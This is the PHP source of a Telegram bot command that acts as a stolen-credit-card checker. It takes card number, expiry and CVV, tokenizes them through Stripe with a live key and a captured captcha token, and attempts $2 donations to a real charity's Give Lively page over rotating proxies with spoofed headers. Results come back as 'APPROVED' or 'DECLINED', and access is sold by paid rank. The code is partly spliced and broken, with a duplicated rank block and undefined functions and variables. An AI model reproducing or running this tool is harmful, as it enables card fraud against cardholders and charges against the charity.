<?php


error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');


  //=========RANK DETERMINE=========//
  $currentDate = date('Y-m-d');
      $rank = "FREE";
      $expiryDate = "0";

      $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
      $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
      $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

$gate = "𝙎𝙏𝙍𝙄𝙋𝙀 2$";
$gcm = "/see";


    if(in_array($userId, $owners)) {
          $rank = "OWNER";
         $expiryDate = "UNTIL DEAD"; 
      } else { 
          foreach ($paidUsers as $index => $line) {
              list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
              if ($userIdFromFile == $userId) {
                  if ($userExpiryDate < $currentDate) {
                      unset($paidUsers[$index]); //
                      file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                      $freeUsers[] = $userId; // add to free users list
                      file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                  } else    $currentDate = date('Y-m-d');
      $rank = "FREE";
      $expiryDate = "0";

      $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
      $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
      $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

      if(in_array($userId, $owners)) {
          $rank = "OWNER";
         $expiryDate = "UNTIL DEAD"; 
      } else {
          foreach ($paidUsers as $index => $line) {
              list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
              if ($userIdFromFile == $userId) {
                  if ($userExpiryDate < $currentDate) {
                      unset($paidUsers[$index]); 
                      file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                      $freeUsers[] = $userId; 
                      file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                  } else {
                      $rank = "PAID";
                      $expiryDate = $userExpiryDate;
                  }
              }
          }
      } {
                      $rank = "PAID";
                      $expiryDate = $userExpiryDate;
                  }
              }
          }
      }
  //=======RANK DETERMINE END=========//
  $update = json_decode(file_get_contents("php://input"), TRUE);
  $text = $update["message"]["text"];
  //========WHO CAN CHECK FUNC========//

  //=====WHO CAN CHECK FUNC END======//
  if (preg_match('/^(\/see|\.see|!see)/', $text)) {
      $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username 𝘠𝘖𝘜 𝘈𝘙𝘌 𝘕𝘖𝘛 𝘗𝘙𝘌𝘔𝘐𝘜𝘔 𝘜𝘚𝘌𝘙  ❌</b>", $message_id);
        exit();
    }
  $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
      $message_id = $update["message"]["message_id"];
      $keyboard = "";

  //=======WHO CAN CHECK END========//

  //====ANTISPAM AND WRONG FORMAT====//
      if (strlen($message) <= 4) {
              sendMessage($chatId, "!𝙒𝙍𝙊𝙉𝙂 𝙁𝙊𝙍𝙈𝘼𝙏!%0A𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>$gcm cc|mm|yy|cvv</code>%0A𝙂𝘼𝙏𝙀𝙒𝘼𝙔 - <b>$gate</b>", $message_id);
              exit();
    }
  $r = "0";

  $r = rand(0, 100);
  //==ANTISPAM AND WRONG FORMAT END==//


  //=======checker part start========//
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
      extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
      extract($_GET);
  }
  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }


  $lista = substr($message, 5);
  $separa = explode("|", $lista);
  $cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
  $mes = isset($separa[1]) ? $separa[1] : '';
  $ano = isset($separa[2]) ? $separa[2] : '';
  $cvv = isset($separa[3]) ? $separa[3] : '';


  $last4 = substr($cc, -4);


  $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>𝙍𝙀𝘼𝘿𝙄𝙉𝙂 𝙐𝙍 𝙍𝙀𝙌𝙐𝙀𝙎𝙏 ✅</b>");

  function value($str,$find_start,$find_end)
  {
      $start = @strpos($str,$find_start);
      if ($start === false) 
      {
          return "";
      }
      $length = strlen($find_start);
      $end    = strpos(substr($str,$start +$length),$find_end);
      return trim(substr($str,$start +$length,$end));
  }

  function mod($dividendo,$divisor)
  {
      return round($dividendo - (floor($dividendo/$divisor)*$divisor));
  }
  //================[Functions and Variables]================//
  #------[Email Generator]------#



  function emailGenerate($length = 10)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
  }
  $email = emailGenerate();
  #------[Username Generator]------#
  function usernameGen($length = 13)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $un = usernameGen();
  #------[Password Generator]------#
  function passwordGen($length = 15)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $pass = passwordGen();

  #------[CC Type Randomizer]------#

   $cardNames = array(
      "3" => "American Express",
      "4" => "Visa",
      "5" => "MasterCard",
      "6" => "Discover"
   );
   $card_type = $cardNames[substr($cc, 0, 1)];





    //==================[Randomizing Details]======================//


  //==============[Randomizing Details-END]======================//



    //==================[BIN LOOK-UP]======================//

    $ch = curl_init();

    $bin = substr($cc, 0, 6);

    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $alpha2 = $binna['country']['alpha2'];
    $emoji = $binna['country']['emoji'];
    $type = $binna['type'];
    $category = $binna['category'];
    $bank = $binna['bank']['name'];
    $url = $binna['bank']['url'];
    $phone = $binna['bank']['phone'];
    curl_close($ch);

    $bank = "$bank";
    $country = "$country $emoji ";
    $bin = "$bin - ($alpha2) -[$emoji] ";
    $bininfo = "$type - $brand - $category";
    $url = "$url";
    $type = strtoupper($type);

  //==================[BIN LOOK-UP-END]======================//



    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");

  //=======================[5 REQ]==================================//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Host: api.stripe.com';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: en';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Path: /v1/tokens';
  $headers[] = 'Origin: https://js.stripe.com';
  $headers[] = 'Referer: https://js.stripe.com/';
  $headers[] = 'sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"';
  $headers[] = 'sec-ch-ua-mobile: ?0';
  $headers[] = 'sec-ch-ua-platform: "Windows"';
  $headers[] = 'Sec-Fetch-Dest: empty';
  $headers[] = 'Sec-Fetch-Mode: cors';
  $headers[] = 'Sec-Fetch-Site: same-site';
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'guid=4d4286f3-3a7f-434a-a3f9-5ec9566ed74d3246b1&muid=bc58c183-a174-4fbb-930f-23e5e89d284369164a&sid=7afda86d-b7e4-4792-aa53-e335c8715f5274537a&referrer=https%3A%2F%2Fsecure.givelively.org&time_on_page=1465801&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZK7zfZqDso_Viocnr-Ud21NMznxhVmGmGkpHrNVzt5aSbqnNUBsNFg5U98B0hmLPB2mjZ--EQA-947gFfx_cfT3R1bmGmAcFjj_1DHrJGLwh3nJpE_ig_O-ptXr8DeqBc3KnBFWl96I1Ze1rYjjsdadodXb_hNEyxFcIiIr_UlPFgFrcnbIF4UyvdbFxJ3MubR3QBMyjPPML1XIo9EJBnSq8NJ3Jyy_HM__jzoWJ9bn_yFT2_9C-ui19yFJmAxH7rK5biJzyibgxFMYdpyGjCrRkHBLJgEbWdvT82ijEk-7gQBWe5ujRsX6w1vfIPLUxCsggtCc48r5Rj8flnprbb-rWkvMTp__MIsPCGfxCub-0ecT2bLumJHmAXFX7kyoWWDMAMlooqwrgDaqy7HLw1-GFRYwbRwgcZRZdqIWZ8sqUfXG9o4hHWcZwM-wmP9CKUfO0OheV2KD3GMjBmd4Lqt4axpOFWzl6iezRotqpR3gwMKe8RK2e8tJj6c92b46RWrthPZeb6RUZyh1bLauqZAMgh6MpDPZ8MQSbYFnBLwScVK713R_aMzE9zATnNqiny_Z6ZVHhMZHHUpVPtzOBTrLQN2BLo2KvwpPefo_vGBJqxJJH4xJJhUyO6WhxOmFPUvnmTBkITPaG6Lbz0Kt2uyH1i7x9OgM2XZcWoMwqJY6axrnHl-YSJqzqtHJIKG6rs85vMeivyYZ5p86OUQb4zKQo8t2IETbfICTUGYtmZUl3qvCDk_3nvcdZBEZNKJZ0FK_p1BJfDdcLGEW8SHFr6k52RvY-d_v8YgOYNhu8tEXMdKH315sTgE1kk6ofXrlg4UUcLVHDFmyas-DmFiPFBfOTsuPMAlap8qxDDufQTicrsezhBcKT_7URgBEBpbjO5UDa-0Md-kpPubpC1VWwlCny_rXgFvquJc9vgU7x5d9Mkcsrt8oNdbNRq7ks76TLWwA5y7t27ZQgVjgWGnvvhIKtzRxwq6sT2yQgcPoQeJ2OTvG_Onx9kFiGwYt8Dt8lijbIQro1JU_URSertLsJi_FD43QyocZgHhMlVVAO4RwEefxOpUu7wSBv9hZhSDnO_lb6i15BMZvtdHaC69aCpq460MgfvhFhSR3-aD99MIR07B8ayGml3dsmqJ_XmFoPEF1Vx3xXobhdFb6MlsER7HKKRK6_7d_DCklCX8rwMqhi9p3YqzUvVvQQxYiT3JWl5uvQ5oX-tJTgxFiS7aTHY1VqbKsvADCsmprTRJIYGEd8MmlJO468SVubnydv85ls4WCOjUEa5BI9qpW0IhGcFfrcOmbjwkGe-EtIFxhngCrqX8we35iU_PwQU7kKT1Gu2ansCborPnW8daNIx_N8ZxZ5sX_AYgUvXC4SqtlPGkyua1QMD3D3goWWLh7IWtJo6YaOiHt2lKHJNyUjig08zVsvThjotxBCrNzh2uhu-P_tJ3fgtTCrfqOq0CIzW01G_JUYR7vAJculbaGJoFoJbA598l2d0mySaAt1MFfWiD7XbeIowAPNGNi1Ee-hpjfVI-XVrikByUMaOwanC0QPzXrVRIS7JKd4mVoMoCUmUhwgJwI5ur6TBOc9pSYq8lIWHMez6BvkwSTTbO4s0yNwSbzgJA1POeN0jqzVxm7fi2YOlzLv9rChWrHoCPUuWEs8JFJidbPa8fFV1gk1roVQidvMr2xNeicihio_BsmNcNFy80GPJVji_R27eCrqJ9Y5NJdVMqb8hdnoxGG_ud1TzAllCXm7GCOKhpdeeG9T2cgrZe1pJ0KjQ-NX7wOI8kPGfB1q8wGJgPVJpeCwCCr_LgQe7mPqwz2dYO6WxWli3pWeRpQxc7Tb4EMZ4uCqmTYjIKGXDwby8s2y055AVV_6X3772yzNSnqEcTRGHMJs6RdBs2iTEiEOd5reZn90J6kMJUutRIN8V881C4yCwY-0Y2JlWeRIWf1_78UYWPyPgb8GKNoisIg3u2C3PwSoVYQTMS-3bK9NmoVyeYwRQ6N7ErlJnMygyvwvWrkSCv-URcQNSciIHWXpineUpLl-ZCader8FsuWGqLIXEwa01nmtZH1Q5Naqe1rprAUSAdTsQcGDKDqD-gZ80WD3v6jyyQ8sjz3Vgz0LT38cp1xUHd4y39K_tto_1PGSy1ztqjZXhwzmZTMu2oc2hhcmRfaWTOD3Lqb6JrcqgzYTM0NDg2Y6JwZAA.Fy-NbCERHe9aR9cWvZ3HltNNGLkIofVmr9pufJmayHY&payment_user_agent=stripe.js%2F2649440aa6%3B+stripe-js-v3%2F2649440aa6%3B+card-element&pasted_fields=number&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI');

  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
  $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

    sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");

  //==================req 1 end===============//
  //==================req 2===============//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://secure.givelively.org/donate.json');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array(
'authority: secure.givelively.org',
'method: POST',
'path: /donate.json',
'scheme: https',
'accept: */*',
'cnntent-Type: application/x-www-form-urlencoded',
'cookie: _hjSessionUser_1561839=eyJpZCI6IjAxOTAyOTRkLWMzODgtNTFkYi1hMTgwLWQ1MDc4NzIyZGQzMSIsImNyZWF0ZWQiOjE3MTY3MjY5NzIwOTYsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1561839=eyJpZCI6IjMzMDNhYjYxLTcwM2MtNDEzNy04NDQyLWNhNzIwMjBlMjk3YyIsImMiOjE3MTY3MjY5NzIwOTcsInMiOjEsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; datadome=qcEjEVRTxQ3XTw5IHtambnL0n7l7skbcDPdylh3SElHibBXxWjTWPBaZ5eZhlUDLDkLdJD2N2gLtRRgnlg9vvr1FfppTHZrJOnz3UzRtRbpRx9Jfy5_ccLuPjo2cI4~0',
'Origin: https://secure.givelively.org',
'referer: https://secure.givelively.org/donate/think-wild?ref=sd_widget&widget_url=https%3A%2F%2Fwww.thinkwildco.org%2Fsupport-us%2Fdonate%2F&referrer_url=https%3A%2F%2Fwww.thinkwildco.org%2Fdonate%2F&show_donate_now_button=false&show_v1_form=branded_widget',
'sec-Fetch-Dest: empty',
'sec-Fetch-Mode: cors',
'sec-Fetch-Site: same-origin',
'user-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    );

sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");


  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=1&checkjavascript=1&username='.$pass.'&password=abhyan3434&password2=abhyan3434&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&CardType='.$card_type.'&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  $result2 = curl_exec($ch);
  $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

  //==================req 2 end===============//



    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>[×] 𝙋𝙍𝙊𝘾𝙀𝙎𝙎𝙄𝙉𝙂 - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] 𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
[×] 𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ $gate
[×] 𝘽𝘼𝙉𝙆 ↯ $bank
[×] 𝙏𝙔𝙋𝙀 ↯ $bininfo
[×] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| 𝙈𝘼𝙓 𝙏𝙄𝙈𝙀 ↯ 25 𝙎𝙀𝘾
|×| 𝙍𝙀𝙌 𝘽𝙔 ↯ @$username</b>");

    //======checker part end=========//
$end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);


  if (
      strpos($result2, 'Thank you for your membership.') !== false ||
      strpos($result2, "Membership Confirmation") !== false ||
      strpos($result2, 'Your card zip code is incorrect.') !== false ||
      strpos($result2, "Thank You For Donation.") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Success ") !== false ||
      strpos($result2, '"type":"one-time"') !== false ||
      strpos($result2, "/donations/thank_you?donation_number=") !== false
  ) {
    $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿  ✅

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>$gate</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>2$ Charge Successfully 🟢</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu";
  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
      strpos($result2, "Your card does not support this type of purchase.") !== false ||
      strpos($result2, 'transaction_not_allowed') !== false ||
      strpos($result2, "insufficient_funds") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Your card has insufficient funds.") !== false ||
      strpos($result2, '"status":"success"') !== false ||
      strpos($result2, "stripe_3ds2_fingerprint") !== false
  ) {
  $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>$gate</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>1000:Approved 🟢</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'security code is incorrect.') !== false ||
      strpos($result2, 'security code is invalid.') !== false ||
      strpos($result2, "Your card's security code is incorrect.") !== false
  ) {
  $resp = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>$gate</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$msg 🟢</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
  $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>$gate</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$msg 🔴</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
  $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>$gate</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$msg 🔴</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  else {
  $resp = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌

𝘾𝘼𝙍𝘿 ↯ <code>$lista</code>
𝙂𝘼𝙏𝙀𝙒𝘼𝙔 ↯ <code>$gate</code>
𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ↯ <code>$msg 🔴</code>

𝘽𝙄𝙉 𝙄𝙉𝙁𝙊 ↯ <code>$bininfo</code> 
𝘽𝘼𝙉𝙆 ↯ <code>$bank</code>
𝘾𝙊𝙐𝙉𝙏𝙍𝙔 ↯ <code>$country</code>

𝙏𝙄𝙈𝙀 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }
  }
